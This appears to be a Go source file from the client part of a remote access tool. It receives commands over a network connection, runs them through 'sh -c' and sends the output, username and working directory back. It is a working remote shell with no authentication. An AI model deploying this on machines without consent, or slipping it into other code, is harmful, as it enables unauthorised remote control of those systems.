package commands

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"src/Client/generic/logger"
	"src/Client/session/protocol"
	"strings"
	"time"
)

// RunShellCommand executes a shell command with a timeout.
// It takes a command string as input, which can include arguments.
// To prevent commands from running indefinitely and to enhance security,
// it uses a context with a 30-second timeout.
//
// Parameters:
//   - commandStr: The full command string to be executed (e.g., "ls -la /tmp").
//
// Returns:
//   - A string containing the combined standard output and standard error of the command.
//   - An error if the command fails to start, is terminated by the timeout,
//     or returns a non-zero exit code.
func RunShellCommand(commandStr string) (string, error) {
	// --- Security and Stability: Implement a Timeout ---
	// Create a context that will be cancelled after 30 seconds.
	// This is a critical security measure to prevent long-running commands
	// from tying up server resources.
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel() // Ensure the context is cancelled to release resources.

	// --- Command Execution ---
	// Use 'sh -c' to properly handle commands with arguments and pipelines.
	// This is a common and reliable way to execute a command string in a shell.
	cmd := exec.CommandContext(ctx, "sh", "-c", commandStr)

	// Buffers to capture the command's standard output and standard error.
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// --- Start and Wait for the Command ---
	// Start the command. This call is non-blocking.
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start command: %w", err)
	}

	// Wait for the command to complete. This is a blocking call.
	// It will return an error if the command returns a non-zero exit code
	// or if the context's deadline is exceeded.
	err := cmd.Wait()

	// --- Handle Errors and Output ---
	// Combine the output from both stdout and stderr for a complete result.
	// This is useful for debugging as it shows both regular output and error messages.
	output := strings.TrimSpace(stdout.String())
	errorOutput := strings.TrimSpace(stderr.String())

	combinedOutput := output
	if errorOutput != "" {
		if combinedOutput != "" {
			combinedOutput += "\n"
		}
		combinedOutput += "Stderr: " + errorOutput
	}

	// Check if the context was cancelled due to a timeout.
	if ctx.Err() == context.DeadlineExceeded {
		return combinedOutput, fmt.Errorf("command timed out after 30 seconds")
	}

	// If Wait() returned an error, it could be a non-zero exit code.
	// We return the captured output along with the error.
	if err != nil {
		return combinedOutput, fmt.Errorf("command execution failed: %w", err)
	}

	// If everything succeeded, return the combined output and no error.
	return combinedOutput, nil
}

func ShellHandler(conn net.Conn) {
	currentInfo, err := os.Getwd()
	if err != nil {
		fmt.Fprintf(conn, "Error getting current directory: %v\n", err)
		protocol.SendData(conn, []byte("Error getting current directory."))
		return
	}
	userInfo, err := user.Current()
	if err != nil {
		fmt.Fprintf(conn, "Error getting user information: %v\n", err)
		protocol.SendData(conn, []byte("Error getting user information."))
		return
	}
	info := userInfo.Username + "<sep>" + currentInfo
	logger.Log(fmt.Sprintf("Current user: %s, Current directory: %s", userInfo.Username, currentInfo))
	protocol.SendData(conn, []byte(info))
	for {
		command, err := protocol.ReceiveData(conn)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
			return
		}
		commandStr := string(command)
		logger.Log(fmt.Sprintf("Received command: %s", commandStr))

		if commandStr == "exit" {
			logger.Log("Exiting shell handler.")
			break
		}
		if strings.HasPrefix(commandStr, "cd") {
			parts := strings.Fields(commandStr)
			var targetDir string
			if len(parts) < 2 {
				currentUser, err := user.Current()
				if err != nil {
					logger.Error(fmt.Sprintf("Failed to get current user: %v", err))
					protocol.SendData(conn, []byte(fmt.Sprintf("Error getting user info: %v", err)))
					continue
				}
				targetDir = currentUser.HomeDir
			} else {
				targetDir = parts[1]
			}
			err := os.Chdir(targetDir)
			if err != nil {
				logger.Error(fmt.Sprintf("Failed to change directory: %v", err))
				protocol.SendData(conn, []byte(fmt.Sprintf("Error changing directory: %v<sep>%s", err, currentInfo)))
				continue
			}
			currentInfo, err = os.Getwd()
			if err != nil {
				logger.Error(fmt.Sprintf("Error getting current directory after cd: %v", err))
				protocol.SendData(conn, []byte(fmt.Sprintf("Error getting current directory after cd: %v<sep>%s", err, currentInfo)))
				continue
			}
			logger.Log(fmt.Sprintf("Changed directory to: %s", currentInfo))
			protocol.SendData(conn, []byte(fmt.Sprintf("Changed directory to: %s<sep>%s", currentInfo, currentInfo)))
			continue
		}

		output, err := RunShellCommand(commandStr)
		if err != nil {
			logger.Error(fmt.Sprintf("Command execution failed: %v", err))
			protocol.SendData(conn, []byte(fmt.Sprintf("Error executing command: %v", err)))
			continue
		}
		currentInfo, err := os.Getwd()
		if err != nil {
			logger.Error(fmt.Sprintf("Error getting current directory: %v", err))
			protocol.SendData(conn, []byte("Error getting current directory."))
			continue
		}
		output += "<sep>" + currentInfo
		protocol.SendData(conn, []byte(output))
	}
	logger.Log("Shell handler finished.")
	return
}
